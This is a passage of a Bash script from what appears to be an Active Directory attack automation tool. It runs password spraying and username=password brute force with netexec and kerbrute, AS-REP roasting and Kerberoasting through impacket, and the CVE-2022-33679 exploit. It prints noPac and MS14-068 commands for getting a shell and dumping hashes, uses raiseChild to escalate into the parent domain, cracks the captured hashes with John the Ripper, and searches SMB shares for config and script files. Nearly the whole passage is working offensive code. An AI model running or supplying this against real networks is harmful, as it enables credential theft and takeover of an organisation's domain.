        userslist_ans="N"
        echo -e "${PURPLE}[!] No known users found. Would you like to use custom wordlist instead (y/N)?${NC}"
        read -rp ">> " userslist_ans </dev/tty
        if [[ "${userslist_ans}" == "y" ]] || [[ "${userslist_ans}" == "Y" ]]; then
            target_userslist="${user_wordlist}"
        fi
    fi
    echo -e "${BLUE}[*] netexec User=Pass Check (Noisy!)${NC}"
    echo -e "${YELLOW}[i] Finding users with Password = username using netexec. This may take a while...${NC}"
    run_command "${netexec} ${ne_verbose} smb ${target} -u ${target_userslist} -p ${target_userslist} --no-bruteforce --continue-on-success" | tee "${BruteForce_dir}/ne_userpass_output_${dc_domain}.txt"
    grep "\[+\]" "${BruteForce_dir}/ne_userpass_output_${dc_domain}.txt" | cut -d "\\" -f 2 | cut -d " " -f 1 >"${BruteForce_dir}/user_eq_pass_valid_ne_${dc_domain}.txt"
    if [ -s "${BruteForce_dir}/user_eq_pass_valid_ne_${dc_domain}.txt" ]; then
        echo -e "${GREEN}[+] Printing accounts with username=password...${NC}"
        /bin/cat "${BruteForce_dir}/user_eq_pass_valid_ne_${dc_domain}.txt" | sort -uf
    elif [ "${noexec_bool}" == "false" ]; then
        echo -e "${PURPLE}[-] No accounts with username=password found${NC}"
    fi
    echo -e ""
}

userpass_kerbrute_check() {
    if ! stat "${kerbrute}" >/dev/null 2>&1; then
        echo -e "${RED}[-] Please verify the location of kerbrute${NC}"
    else
        target_userslist="${users_list}"
        user_pass_wordlist="${BruteForce_dir}/kerbrute_userpass_wordlist_${dc_domain}.txt"
        echo -e "${BLUE}[*] kerbrute User=Pass Check (Noisy!)${NC}"
        if [ ! -s "${users_list}" ]; then
            userslist_ans="N"
            echo -e "${PURPLE}[!] No known users found. Would you like to use custom wordlist instead (y/N)?${NC}"
            read -rp ">> " userslist_ans </dev/tty
            if [[ "${userslist_ans}" == "y" ]] || [[ "${userslist_ans}" == "Y" ]]; then
                target_userslist="${user_wordlist}"
            fi
        fi
        echo -e "${YELLOW}[i] Finding users with Password = username using kerbrute. This may take a while...${NC}"
        /bin/rm "${user_pass_wordlist}" 2>/dev/null
        while IFS= read -r i; do
            clean_user=$(echo "${i}" | tr -d '\r')
            echo -e "${clean_user}:${clean_user}" >>"${user_pass_wordlist}"
        done <"${target_userslist}"
        sort -uf "${user_pass_wordlist}" -o "${user_pass_wordlist}"
        run_command "${kerbrute} bruteforce ${user_pass_wordlist} -d ${dc_domain} --dc ${dc_ip} -t 5 ${argument_kerbrute}" | tee "${BruteForce_dir}/kerbrute_pass_output_${dc_domain}.txt"
        grep "VALID" "${BruteForce_dir}/kerbrute_pass_output_${dc_domain}.txt" | cut -d " " -f 8 | cut -d "@" -f 1 >"${BruteForce_dir}/user_eq_pass_valid_kerb_${dc_domain}.txt"
        if [ -s "${BruteForce_dir}/user_eq_pass_valid_kerb_${dc_domain}.txt" ]; then
            echo -e "${GREEN}[+] Printing accounts with username=password...${NC}"
            /bin/cat "${BruteForce_dir}/user_eq_pass_valid_kerb_${dc_domain}.txt" | sort -uf
        elif [ "${noexec_bool}" == "false" ]; then
            echo -e "${PURPLE}[-] No accounts with username=password found${NC}"
        fi
    fi
    echo -e ""
}

ne_passpray() {
    target_userslist="${users_list}"
    if [ ! -s "${users_list}" ]; then
        userslist_ans="N"
        echo -e "${PURPLE}[!] No known users found. Would you like to use custom wordlist instead (y/N)?${NC}"
        read -rp ">> " userslist_ans </dev/tty
        if [[ "${userslist_ans}" == "y" ]] || [[ "${userslist_ans}" == "Y" ]]; then
            target_userslist="${user_wordlist}"
        fi
    fi
    echo -e "${BLUE}[*] Password spray using netexec (Noisy!)${NC}"
    echo -e "${BLUE}[*] Please specify password for password spray:${NC}"
    read -rp ">> " passpray_password </dev/tty
    while [ "${passpray_password}" == "" ]; do
        echo -e "${RED}Invalid password.${NC} Please specify password:"
        read -rp ">> " passpray_password </dev/tty
    done
    echo -e "${YELLOW}[i] Password spraying with password ${passpray_password}. This may take a while...${NC}"
    run_command "${netexec} ${ne_verbose} ldap --port ${ldap_port} ${target} -u ${target_userslist} -p ${passpray_password} --no-bruteforce --continue-on-success --log ${BruteForce_dir}/ne_passpray_output_${dc_domain}.txt" 2>&1
    grep "\[+\]" "${BruteForce_dir}/ne_passpray_output_${dc_domain}.txt" | cut -d "\\" -f 2 | cut -d " " -f 1 >"${BruteForce_dir}/passpray_valid_ne_${dc_domain}.txt"
    if [ -s "${BruteForce_dir}/passpray_valid_ne_${dc_domain}.txt" ]; then
        echo -e "${GREEN}[+] Printing accounts with passwords found...${NC}"
        /bin/cat "${BruteForce_dir}/passpray_valid_ne_${dc_domain}.txt" | sort -uf
    elif [ "${noexec_bool}" == "false" ]; then
        echo -e "${PURPLE}[-] No accounts with password ${passpray_password} found${NC}"
    fi
    echo -e ""
}

kerbrute_passpray() {
    if ! stat "${kerbrute}" >/dev/null 2>&1; then
        echo -e "${RED}[-] Please verify the location of kerbrute${NC}"
    else
        target_userslist="${users_list}"
        if [ ! -s "${users_list}" ]; then
            userslist_ans="N"
            echo -e "${PURPLE}[!] No known users found. Would you like to use custom wordlist instead (y/N)?${NC}"
            read -rp ">> " userslist_ans </dev/tty
            if [[ "${userslist_ans}" == "y" ]] || [[ "${userslist_ans}" == "Y" ]]; then
                target_userslist="${user_wordlist}"
            fi
        fi
        echo -e "${BLUE}[*] Password spray using kerbrute (Noisy!)${NC}"
        echo -e "${BLUE}[*] Please specify password for password spray:${NC}"
        read -rp ">> " passpray_password </dev/tty
        while [ "${passpray_password}" == "" ]; do
            echo -e "${RED}Invalid password.${NC} Please specify password:"
            read -rp ">> " passpray_password </dev/tty
        done
        echo -e "${YELLOW}[i] Password spraying with password ${passpray_password}. This may take a while...${NC}"
        run_command "${kerbrute} passwordspray ${target_userslist} ${passpray_password} -d ${dc_domain} --dc ${dc_ip} -t 5 ${argument_kerbrute}" | tee "${BruteForce_dir}/kerbrute_passpray_output_${dc_domain}.txt"
        grep "VALID" "${BruteForce_dir}/kerbrute_passpray_output_${dc_domain}.txt" | cut -d " " -f 8 | cut -d "@" -f 1 >"${BruteForce_dir}/passpray_valid_kerb_${dc_domain}.txt"
        if [ -s "${BruteForce_dir}/passpray_valid_kerb_${dc_domain}.txt" ]; then
            echo -e "${GREEN}[+] Printing accounts with passwords found ...${NC}"
            /bin/cat "${BruteForce_dir}/passpray_valid_kerb_${dc_domain}.txt" | sort -uf
        elif [ "${noexec_bool}" == "false" ]; then
            echo -e "${PURPLE}[-] No accounts with password ${passpray_password} found${NC}"
        fi
    fi
    echo -e ""
}

ne_pre2k() {
    echo -e "${BLUE}[*] Pre2k Enumeration using netexec${NC}"
    run_command "echo -n Y | ${netexec} ${ne_verbose} ldap --port ${ldap_port} ${target} ${argument_ne} -M pre2k --log ${BruteForce_dir}/ne_pre2k_output_${dc_domain}.txt" 2>&1
    echo -e ""
}

pre2k_check() {
    if ! stat "${pre2k}" >/dev/null 2>&1; then
        echo -e "${RED}[-] Please verify the installation of pre2k${NC}"
    else
        echo -e "${BLUE}[*] Pre2k authentication check (Noisy!)${NC}"
        pre2k_outputfile="${BruteForce_dir}/pre2k_outputfile_${dc_domain}.txt"
        if [ "${nullsess_bool}" == true ]; then
            if [ ! -s "${servers_hostname_list}" ]; then
                echo -e "${PURPLE}[-] No computers found! Please re-run computers enumeration and try again..${NC}"
            else
                run_command "${pre2k} unauth ${argument_pre2k} -dc-ip ${dc_ip} -inputfile ${servers_hostname_list} -outputfile ${pre2k_outputfile}" | tee "${BruteForce_dir}/pre2k_output_${dc_domain}.txt"
            fi
        else
            if [ "${ldapbindsign_bool}" == true ]; then ldapbindsign_param="-binding"; else ldapbindsign_param=""; fi
            if [ "${ldaps_bool}" == true ]; then ldaps_param="-ldaps ${ldapbindsign_param}"; else ldaps_param=""; fi
            run_command "${pre2k} auth ${argument_pre2k} -dc-ip ${dc_ip} -outputfile ${pre2k_outputfile} ${ldaps_param}" | tee "${BruteForce_dir}/pre2k_output_${dc_domain}.txt"
        fi
    fi
    echo -e ""
}

ldapnomnom_enum() {
    if [ "${nullsess_bool}" == true ]; then
        if ! stat "${ldapnomnom}" >/dev/null 2>&1; then
            echo -e "${RED}[-] Please verify the location of ldapnomnom${NC}"
        else
            echo -e "${BLUE}[*] ldapnomnom User Enumeration (Null session)${NC}"
            echo -e "${YELLOW}[i] Using $user_wordlist wordlist for user enumeration. This may take a while...${NC}"
            if [ "${ldaps_bool}" == true ]; then ldaps_param="--tlsmode tls --port ${ldap_port}"; else ldaps_param=""; fi
            run_command "${ldapnomnom} --server ${dc_ip} --port ${ldap_port} --dnsdomain ${dc_domain} ${ldaps_param} --maxservers 4 --parallel 8 --input ${user_wordlist} --output ${Users_dir}/users_list_ldapnomnom_${dc_domain}.txt" | tee -a "${BruteForce_dir}/ldapnomnom_user_output_${dc_domain}.txt"
            if [ -s "${Users_dir}/users_list_ldapnomnom_${dc_domain}.txt" ]; then
                echo -e ""
                echo -e "${GREEN}[+] Printing valid accounts...${NC}"
                sort -uf "${Users_dir}/users_list_ldapnomnom_${dc_domain}.txt" | sort -uf
                parse_users
            fi
        fi
    else
        echo -e "${PURPLE}[-] ldapnomnom null session enumeration skipped (credentials provided)${NC}"
    fi
    echo -e ""
}

ne_timeroast() {
    echo -e "${BLUE}[*] Timeroast attack (NTP)${NC}"
    run_command "${netexec} ${ne_verbose} smb ${target} ${argument_ne} -M timeroast --log ${BruteForce_dir}/ne_timeroast_${dc_domain}.txt"
    echo -e ""
}

spearspray_console() {
    if ! stat "${spearspray}" >/dev/null 2>&1; then
        echo -e "${RED}[-] Please verify the installation of spearspray${NC}"
    else
        if [ "${nullsess_bool}" == true ] || [ "${kerb_bool}" == true ] || [ "${aeskey_bool}" == true ] || [ "${hash_bool}" == true ]; then
            echo -e "${PURPLE}[-] spearspray only supports password authentication ${NC}"
        else
            echo -e "${BLUE}[*] Launching spearspray${NC}"
            if [ "${ldaps_bool}" == true ]; then ldaps_param="--ssl"; else ldaps_param=""; fi
            run_command "${spearspray} ${argument_spearspray} -dc ${dc_ip} ${ldaps_param}" 2>&1 | tee -a "${BruteForce_dir}/spearspray_output_${dc_domain}.txt"
        fi
    fi
    echo -e ""
}

###### kerberos: Kerberos attacks
asrep_attack() {
    if ! stat "${impacket_GetNPUsers}" >/dev/null 2>&1; then
        echo -e "${RED}[-] GetNPUsers.py not found! Please verify the installation of impacket${NC}"
    else
        echo -e "${BLUE}[*] ASREP-Roasting Attack${NC}"
        if [[ "${dc_domain,,}" != "${domain,,}" ]] || [ "${nullsess_bool}" == true ]; then
            if [ -s "${users_list}" ]; then
                users_scan_list=${users_list}
            else
                echo -e "${YELLOW}[i] No credentials for target domain provided. Using $user_wordlist wordlist...${NC}"
                users_scan_list=${user_wordlist}
            fi
            run_command "${impacket_GetNPUsers} ${dc_domain}/ -usersfile ${users_scan_list} -request -dc-ip ${dc_ip} -dc-host ${dc_NETBIOS}" >"${Kerberos_dir}/asreproast_output_${dc_domain}.txt"
            grep "krb5asrep" "${Kerberos_dir}/asreproast_output_${dc_domain}.txt" | sed "s/\$krb5asrep\$23\$//" >"${Kerberos_dir}/asreproast_hashes_${dc_domain}.txt" 2>&1
        else
            run_command "${impacket_GetNPUsers} ${argument_imp} -dc-ip ${dc_ip} -dc-host ${dc_NETBIOS}"
            run_command "${impacket_GetNPUsers} ${argument_imp} -request -dc-ip ${dc_ip} -dc-host ${dc_NETBIOS}" >"${Kerberos_dir}/asreproast_output_${dc_domain}.txt"
            #${netexec} ${ne_verbose} smb ${curr_targets_list} "${argument_ne}" --asreproast --log ${Kerberos_dir}/asreproast_output_${dc_domain}.txt" 2>&1
        fi
        if grep -q 'error' "${Kerberos_dir}/asreproast_output_${dc_domain}.txt"; then
            echo -e "${RED}[-] Errors during AS REP Roasting Attack... ${NC}"
        else
            grep "krb5asrep" "${Kerberos_dir}/asreproast_output_${dc_domain}.txt" | sed "s/\$krb5asrep\$23\$//" | tee "${Kerberos_dir}/asreproast_hashes_${dc_domain}.txt" 2>&1
            if [ -s "${Kerberos_dir}/asreproast_hashes_${dc_domain}.txt" ]; then
                hash_count=$(wc -l < "${Kerberos_dir}/asreproast_hashes_${dc_domain}.txt")
                if [[ ! "${hash_count}" == 0 ]]; then
                    echo -e "${GREEN}[+] ${hash_count} hashes extracted! Saved to:${NC} ${Kerberos_dir}/asreproast_hashes_${dc_domain}.txt"
                else
                    echo -e "${PURPLE}[-] Failed to extract hashes!${NC}"
                fi
            elif [ "${noexec_bool}" == "false" ]; then
                echo -e "${PURPLE}[-] No ASREP-Roastable accounts found${NC}"
            fi
        fi
    fi
    echo -e ""
}

asreprc4_attack() {
    if ! stat "${CVE202233679}" >/dev/null 2>&1; then
        echo -e "${RED}[-] Please verify the location of CVE-2022-33679.py${NC}"
    else
        if [ "${nullsess_bool}" == true ]; then
            echo -e "${BLUE}[*] CVE-2022-33679 exploit / AS-REP with RC4 session key (Null session)${NC}"
            if ! stat "${Kerberos_dir}/asreproast_hashes_${dc_domain}.txt" >/dev/null 2>&1; then
                echo -e "${YELLOW}[i] ASREP-Roast hashes not found. Initiating ASREP-Roast attack...${NC}"
                asrep_attack
            fi
            asrep_user=$(cut -d "@" -f 1 "${Kerberos_dir}/asreproast_hashes_${dc_domain}.txt" | head -n 1 | cut -d '$' -f 4)
            if [ ! "${asrep_user}" == "" ]; then
                echo -e "${GREEN}[+] ASREP-Roastable user found: ${asrep_user}${NC}"
                current_dir=$(pwd)
                cd "${Credentials_dir}" || exit
                run_command "${python3} ${CVE202233679} ${dc_domain}/${asrep_user} ${dc_domain} -dc-ip ${dc_ip} ${argument_CVE202233679}" 2>&1 | tee "${Kerberos_dir}/CVE-2022-33679_output_${dc_domain}.txt"
                cd "${current_dir}" || exit
                if [ -s "${Kerberos_dir}/CVE-2022-33679_output_${dc_domain}.txt" ]; then
                    echo -e "${GREEN}[+] Exploit output saved to:${NC} ${Kerberos_dir}/CVE-2022-33679_output_${dc_domain}.txt"
                    hash_count=$(grep -c "krb5asrep" "${Kerberos_dir}/CVE-2022-33679_output_${dc_domain}.txt")
                    grep "krb5asrep" "${Kerberos_dir}/CVE-2022-33679_output_${dc_domain}.txt" | sed "s/\$krb5asrep\$23\$//" | tee "${Kerberos_dir}/CVE-2022-33679_hashes_${dc_domain}.txt"
                    if [[ ! "${hash_count}" == 0 ]]; then
                        echo -e "${GREEN}[+] ${hash_count} hashes extracted! Saved to:${NC} ${Kerberos_dir}/CVE-2022-33679_hashes_${dc_domain}.txt"
                    else
                        echo -e "${PURPLE}[-] Failed to extract hashes!${NC}"
                    fi
                else
                    echo -e "${PURPLE}[-] No hashes found in the exploit output.${NC}"
                fi
            else
                echo -e "${PURPLE}[-] No ASREProastable users found to perform Blind Kerberoast. If ASREProastable users exist, re-run ASREPRoast attack and try again.${NC}"
            fi
        else
            echo -e "${PURPLE}[-] CVE-2022-33679 skipped (credentials provided)${NC}"
        fi
    fi
    echo -e ""
}

kerberoast_attack() {
    if ! stat "${impacket_GetUserSPNs}" >/dev/null 2>&1; then
        echo -e "${RED}[-] GetUserSPNs.py not found! Please verify the installation of impacket${NC}"
    else
        if [[ "${dc_domain,,}" != "${domain,,}" ]] || [ "${nullsess_bool}" == true ]; then
            echo -e "${BLUE}[*] Blind Kerberoasting Attack${NC}"
            asrep_user=$(cut -d "@" -f 1 "${Kerberos_dir}/asreproast_hashes_${dc_domain}.txt" | head -n 1)
            if [ ! "${asrep_user}" == "" ]; then
                run_command "${impacket_GetUserSPNs} -no-preauth ${asrep_user} -usersfile ${users_list} -dc-ip ${dc_ip} -dc-host ${dc_NETBIOS} ${dc_domain}" >"${Kerberos_dir}/kerberoast_blind_output_${dc_domain}.txt"
                if grep -q 'error' "${Kerberos_dir}/kerberoast_blind_output_${dc_domain}.txt"; then
                    echo -e "${RED}[-] Errors during Blind Kerberoast Attack... ${NC}"
                elif [ "${noexec_bool}" == "false" ]; then
                    grep "krb5tgs" "${Kerberos_dir}/kerberoast_blind_output_${dc_domain}.txt" | tee "${Kerberos_dir}/kerberoast_hashes_${dc_domain}.txt"
                    hash_count=$(wc -l < "${Kerberos_dir}/kerberoast_hashes_${dc_domain}.txt")
                    if [[ ! "${hash_count}" == 0 ]]; then
                        echo -e "${GREEN}[+] ${hash_count} hashes extracted! Saved to:${NC} ${Kerberos_dir}/kerberoast_hashes_${dc_domain}.txt"
                    else
                        echo -e "${PURPLE}[-] Failed to extract hashes!${NC}"
                    fi
                fi
            else
                echo -e "${PURPLE}[-] No ASREProastable users found to perform Blind Kerberoast. Run ASREPRoast attack and try again.${NC}"
            fi
        else
            echo -e "${BLUE}[*] Kerberoast Attack${NC}"
            run_command "${impacket_GetUserSPNs} ${argument_imp} -dc-ip ${dc_ip} -dc-host ${dc_NETBIOS} -target-domain ${dc_domain}" | tee "${Kerberos_dir}/kerberoast_list_output_${dc_domain}.txt"
            run_command "${impacket_GetUserSPNs} ${argument_imp} -request -dc-ip ${dc_ip} -dc-host ${dc_NETBIOS} -target-domain ${dc_domain}" >"${Kerberos_dir}/kerberoast_output_${dc_domain}.txt"
            #${netexec} ${ne_verbose} smb ${curr_targets_list} "${argument_ne}" --kerberoasting --log ${Kerberos_dir}/kerberoast_output_${dc_domain}.txt" 2>&1
            if grep -q 'error' "${Kerberos_dir}/kerberoast_output_${dc_domain}.txt"; then
                echo -e "${RED}[-] Errors during Kerberoast Attack... ${NC}"
            elif [ "${noexec_bool}" == "false" ]; then
                grep "krb5tgs" "${Kerberos_dir}/kerberoast_output_${dc_domain}.txt" >"${Kerberos_dir}/kerberoast_hashes_${dc_domain}.txt"
                hash_count=$(wc -l < "${Kerberos_dir}/kerberoast_hashes_${dc_domain}.txt")
                if [[ ! "${hash_count}" == 0 ]]; then
                    echo -e "${GREEN}[+] ${hash_count} hashes extracted! Saved to:${NC} ${Kerberos_dir}/kerberoast_hashes_${dc_domain}.txt"
                else
                    echo -e "${PURPLE}[-] Failed to extract hashes!${NC}"
                fi
                grep "MSSQLSvc" "${Kerberos_dir}/kerberoast_list_output_${dc_domain}.txt" | cut -d '/' -f 2 | cut -d ':' -f 1 | cut -d ' ' -f 1 | sort -u >"${Servers_dir}/sql_list_kerberoast_${dc_domain}.txt"
            fi
        fi
    fi
    echo -e ""
}

krbjack_attack() {
    if ! stat "${krbjack}" >/dev/null 2>&1; then
        echo -e "${RED}[-] Please verify the location of krbjack${NC}"
    else
        echo -e "${BLUE}[*] Checking for DNS unsecure updates using krbjack${NC}"
        run_command "${krbjack} check --dc-ip ${dc_ip} --domain ${domain}" 2>&1 | tee "${Kerberos_dir}/krbjack_output_${dc_domain}.txt"
        if ! grep -q 'This domain IS NOT vulnerable' "${Kerberos_dir}/krbjack_output_${dc_domain}.txt"; then
            echo -e "${GREEN}[+] DNS unsecure updates possible! Follow steps below to abuse the vuln and perform AP_REQ hijacking:${NC}"
            echo -e "${krbjack} run --dc-ip ${dc_ip} --target-ip ${dc_ip} --domain ${domain} --target-name ${dc_NETBIOS} --ports 139,445 --executable <PATH_TO_EXECUTABLE_TO_RUN>"
        fi
    fi
    echo -e ""
}

kerborpheus_attack() {
    if ! stat "${orpheus}" >/dev/null 2>&1; then
        echo -e "${RED}[-] orpheus.py not found! Please verify the installation of orpheus${NC}"
    else
        if [ "${nullsess_bool}" == true ]; then
            echo -e "${PURPLE}[-] orpheus requires credentials${NC}"
        else
            echo -e "${BLUE}[*] Kerberoast Attack using Orpheus${NC}"
            current_dir=$(pwd)
            cd "${scripts_dir}/orpheus-main" || exit
            echo "$(date +%Y-%m-%d\ %H:%M:%S); ${orpheus} | tee -a ${Kerberos_dir}/orpheus_output_${dc_domain}.txt" >>"$command_log"
            echo -e "${YELLOW}[i]${NC} Running command: ${python3} ${orpheus}" > /dev/tty
            (
                echo -e "cred ${argument_imp}\ndcip ${dc_ip}\nfile ${Kerberos_dir}/orpheus_kerberoast_hashes_${dc_domain}.txt\n enc 18\n hex 0x40AC0010"
                cat /dev/tty
            ) | /usr/bin/script -qc "${python3} ${orpheus}" /dev/null | tee -a "${Kerberos_dir}/orpheus_output_${dc_domain}.txt"
            cd "${current_dir}" || exit
            if grep -q "krb5tgs" "${Kerberos_dir}/orpheus_kerberoast_hashes_${dc_domain}.txt"; then
                hash_count=$(wc -l < "${Kerberos_dir}/orpheus_kerberoast_hashes_${dc_domain}.txt")
                if [[ ! "${hash_count}" == 0 ]]; then
                    echo -e "${GREEN}[+] ${hash_count} hashes extracted! Saved to:${NC} ${Kerberos_dir}/orpheus_kerberoast_hashes_${dc_domain}.txt"
                else
                    echo -e "${PURPLE}[-] Failed to extract hashes!${NC}"
                fi
            else
                echo -e "${PURPLE}[-] No hashes found during Orpheus Kerberoast attack.${NC}"
            fi
        fi
    fi
    echo -e ""
}

nopac_check() {
    echo -e "${BLUE}[*] NoPac (CVE-2021-42278 and CVE-2021-42287) check ${NC}"
    if [ "${kerb_bool}" == true ]; then
        echo -e "${PURPLE}[-] netexec's nopac does not support kerberos authentication${NC}"
    else
        run_command "${netexec} ${ne_verbose} smb ${target_dc} ${argument_ne} -M nopac --log ${Kerberos_dir}/ne_nopac_output_${dc_domain}.txt" 2>&1
        if grep -q "VULNERABLE" "${Kerberos_dir}/ne_nopac_output_${dc_domain}.txt"; then
            echo -e "${GREEN}[+] Domain controller vulnerable to noPac found! Follow steps below for exploitation:${NC}" | tee -a "${Kerberos_dir}/noPac_exploitation_steps_${dc_domain}.txt"
            echo -e "${CYAN}# Get shell:${NC}" | tee -a "${Kerberos_dir}/noPac_exploitation_steps_${dc_domain}.txt"
            echo -e "noPac.py ${argument_imp} -dc-ip $dc_ip -dc-host ${dc_NETBIOS} --impersonate Administrator -shell [-use-ldap]" | tee -a "${Kerberos_dir}/noPac_exploitation_steps_${dc_domain}.txt"
            echo -e "${CYAN}# Dump hashes:${NC}" | tee -a "${Kerberos_dir}/noPac_exploitation_steps_${dc_domain}.txt"
            echo -e "noPac.py ${argument_imp} -dc-ip $dc_ip -dc-host ${dc_NETBIOS} --impersonate Administrator -dump [-use-ldap]" | tee -a "${Kerberos_dir}/noPac_exploitation_steps_${dc_domain}.txt"
        fi
    fi
    echo -e ""
}

ms14-068_check() {
    echo -e "${BLUE}[*] MS14-068 check ${NC}"
    if ! stat "${impacket_goldenPac}" >/dev/null 2>&1; then
        echo -e "${RED}[-] goldenPac.py not found! Please verify the installation of impacket${NC}"
    else
        if [ "${nullsess_bool}" == true ] || [ "${kerb_bool}" == true ] || [ "${aeskey_bool}" == true ]; then
            echo -e "${PURPLE}[-] MS14-068 requires credentials and does not support Kerberos authentication${NC}"
        else
            run_command "${impacket_goldenPac} ${argument_imp_gp}\\@${dc_FQDN} None -target-ip ${dc_ip}" 2>&1 | tee "${Kerberos_dir}/ms14-068_output_${dc_domain}.txt"
            if grep -q "found vulnerable" "${Kerberos_dir}/ms14-068_output_${dc_domain}.txt"; then
                echo -e "${GREEN}[+] Domain controller vulnerable to MS14-068 found (False positives possible on newer versions of Windows)!${NC}" | tee -a "${Kerberos_dir}/ms14-068_exploitation_steps_${dc_domain}.txt"
                echo -e "${CYAN}# Execute command below to get shell:${NC}" | tee -a "${Kerberos_dir}/ms14-068_exploitation_steps_${dc_domain}.txt"
                echo -e "${impacket_goldenPac} ${argument_imp}@${dc_FQDN} -target-ip ${dc_ip}" | tee -a "${Kerberos_dir}/ms14-068_exploitation_steps_${dc_domain}.txt"
            fi
        fi
    fi
    echo -e ""
}

raise_child() {
    if ! stat "${impacket_raiseChild}" >/dev/null 2>&1; then
        echo -e "${RED}[-] raiseChild.py not found! Please verify the installation of impacket ${NC}"
    elif [ "${nullsess_bool}" == true ]; then
        echo -e "${PURPLE}[-] raiseChild requires credentials${NC}"
    else
        echo -e "${BLUE}[*] Running privilege escalation from Child Domain to Parent Domain using raiseChild${NC}"
        run_command "${impacket_raiseChild} ${argument_imp} -w ${Credentials_dir}/raiseChild_ccache_${user_var}.txt" 2>&1 | tee -a "${Kerberos_dir}/impacket_raiseChild_output.txt"
    fi
    echo -e ""
}

john_crack_asrep() {
    if ! stat "${john}" >/dev/null 2>&1; then
        echo -e "${RED}[-] Please verify the installation of john${NC}"
    else
        echo -e "${BLUE}[*] Cracking found hashes using john the ripper${NC}"
        if [ ! -s "${Kerberos_dir}/asreproast_hashes_${dc_domain}.txt" ]; then
            echo -e "${PURPLE}[-] No accounts with Kerberos preauth disabled found${NC}"
        else
            echo -e "${YELLOW}[i] Using $pass_wordlist wordlist...${NC}"
            echo -e "${CYAN}[*] Launching john on collected asreproast hashes. This may take a while...${NC}"
            echo -e "${YELLOW}[i] Press CTRL-C to abort john...${NC}"
            run_command "$john ${Kerberos_dir}/asreproast_hashes_${dc_domain}.txt --format=krb5asrep --wordlist=$pass_wordlist"
            echo -e "${GREEN}[+] Printing cracked AS REP Roast hashes...${NC}"
            run_command "$john ${Kerberos_dir}/asreproast_hashes_${dc_domain}.txt --format=krb5asrep --show" | tee "${Kerberos_dir}/asreproast_john_results_${dc_domain}.txt"
        fi
    fi
    echo -e ""
}

john_crack_kerberoast() {
    if ! stat "${john}" >/dev/null 2>&1; then
        echo -e "${RED}[-] Please verify the installation of john${NC}"
    else
        echo -e "${BLUE}[*] Cracking found hashes using john the ripper${NC}"
        if [ ! -s "${Kerberos_dir}/kerberoast_hashes_${dc_domain}.txt" ] && [ ! -s "${Kerberos_dir}/targetedkerberoast_hashes_${dc_domain}.txt" ]; then
            echo -e "${PURPLE}[-] No SPN accounts found${NC}"
        else
            echo -e "${YELLOW}[i] Using $pass_wordlist wordlist...${NC}"
            echo -e "${CYAN}[*] Launching john on collected kerberoast hashes. This may take a while...${NC}"
            echo -e "${YELLOW}[i] Press CTRL-C to abort john...${NC}"
            run_command "$john ${Kerberos_dir}/*kerberoast_hashes_${dc_domain}.txt --format=krb5tgs --wordlist=$pass_wordlist"
            echo -e "${GREEN}[+] Printing cracked Kerberoast hashes...${NC}"
            run_command "$john ${Kerberos_dir}/*kerberoast_hashes_${dc_domain}.txt --format=krb5tgs --show" | tee "${Kerberos_dir}/kerberoast_john_results_${dc_domain}.txt"
        fi
    fi
    echo -e ""
}

###### scan_shares: Shares scan
smb_map() {
    if ! stat "${smbmap}" >/dev/null 2>&1; then
        echo -e "${RED}[-] Please verify the installation of smbmap${NC}"
    else
        mkdir -p "${Shares_dir}/smbmapDump_${user_var}"
        echo -e "${BLUE}[*] SMB shares Scan using smbmap${NC}"
        if [ "${kerb_bool}" == true ] || [ "${aeskey_bool}" == true ]; then
            echo -e "${PURPLE}[-] smbmap does not support Kerberos authentication${NC}"
        else
            echo -e "${BLUE}[*] Listing accessible SMB shares - Step 1/2${NC}"
            for i in $(grep -v ':' "${curr_targets_list}"); do
                echo -e "${CYAN}[*] Listing shares on ${i} ${NC}"
                run_command "${smbmap} -H $i ${argument_smbmap}" | grep -v "Working on it..." >"${Shares_dir}/smbmapDump_${user_var}/smb_shares_${dc_domain}_${i}.txt"
                if [ "${nullsess_bool}" == true ]; then
                    echo -e "${CYAN}[*] smbmap enumeration (Guest and random user)${NC}"
                    run_command "${smbmap} -H $i -u 'Guest' -p ''" | grep -v "Working on it..." >>"${Shares_dir}/smbmapDump_${user_var}/smb_shares_${dc_domain}_${i}.txt"
                    run_command "${smbmap} -H $i -u ${rand_user} -p ''" | grep -v "Working on it..." >>"${Shares_dir}/smbmapDump_${user_var}/smb_shares_${dc_domain}_${i}.txt"
                fi
            done

            grep -iaH READ "${Shares_dir}/smbmapDump_${user_var}/smb_shares_${dc_domain}"_*".txt" 2>&1 | grep -v 'prnproc\$\|IPC\$\|print\$\|SYSVOL\|NETLOGON' | sed "s/\t/ /g; s/   */ /g; s/READ ONLY/READ-ONLY/g; s/READ, WRITE/READ-WRITE/g; s/smb_shares_//; s/.txt://g; s/${dc_domain}_//g" | rev | cut -d "/" -f 1 | rev | awk -F " " '{print $1 ";"  $2 ";" $3}' >"${Shares_dir}/all_network_shares_${dc_domain}.csv"
            grep -iaH READ "${Shares_dir}/smbmapDump_${user_var}/smb_shares_${dc_domain}"_*".txt" 2>&1 | grep -v 'prnproc\$\|IPC\$\|print\$\|SYSVOL\|NETLOGON' | sed "s/\t/ /g; s/   */ /g; s/READ ONLY/READ-ONLY/g; s/READ, WRITE/READ-WRITE/g; s/smb_shares_//; s/.txt://g; s/${dc_domain}_//g" | rev | cut -d "/" -f 1 | rev | awk -F " " '{print "\\\\" $1 "\\" $2}' >"${Shares_dir}/all_network_shares_${dc_domain}.txt"

            echo -e "${BLUE}[*] Listing files in accessible shares - Step 2/2${NC}"
            for i in $(grep -va ':' "${curr_targets_list}"); do
                echo -e "${CYAN}[*] Listing files in accessible shares on ${i} ${NC}"
                current_dir=$(pwd)
                mkdir -p "${Shares_dir}/smbmapDump_${user_var}/${i}"
                cd "${Shares_dir}/smbmapDump_${user_var}/${i}" || exit
                run_command "${smbmap} -H $i ${argument_smbmap} -A '\.cspkg|\.publishsettings|\.xml|\.json|\.ini|\.bat|\.log|\.pl|\.py|\.ps1|\.txt|\.config|\.conf|\.cnf|\.sql|\.yml|\.cmd|\.vbs|\.php|\.cs|\.inf' -r --exclude 'ADMIN$' 'C$' 'C' 'IPC$' 'print$' 'SYSVOL' 'NETLOGON' 'prnproc$'" | grep -v "Working on it..." >"${Shares_dir}/smbmapDump_${user_var}/smb_files_${dc_domain}_${i}.txt"
                if [ "${nullsess_bool}" == true ]; then
                    echo -e "${CYAN}[*] smbmap enumeration (Guest and random user)${NC}"
